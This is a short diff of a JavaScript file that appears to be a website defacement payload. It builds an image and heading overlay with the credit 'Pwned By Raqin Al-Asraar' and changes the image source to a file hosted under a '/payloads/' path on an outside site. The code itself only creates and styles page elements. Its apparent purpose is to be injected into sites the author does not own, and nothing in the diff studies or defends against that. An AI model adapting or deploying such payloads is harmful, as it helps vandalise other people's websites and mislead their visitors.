@@ -35,7 +35,7 @@
     // Create the image element
     // Replace the src with your actual image URL
     const image = document.createElement('img');
-    image.src = './ras.png'; // <-- REPLACE THIS with your image URL
+    image.src = 'https://www.aliabbas.site/payloads/ras.png'; // <-- REPLACE THIS with your image URL
     image.alt = 'Pwned By Raqin Al-Asraar';
     image.style.cssText = `
         max-width: 300px;
@@ -47,7 +47,7 @@
     
     // Create the text element
     const text = document.createElement('h1');
-    text.textContent = 'Raqin Al-Asraar';
+    text.textContent = 'Pwned By Raqin Al-Asraar';
     text.style.cssText = `
         color: #ffffff;
         font-size: 3rem;
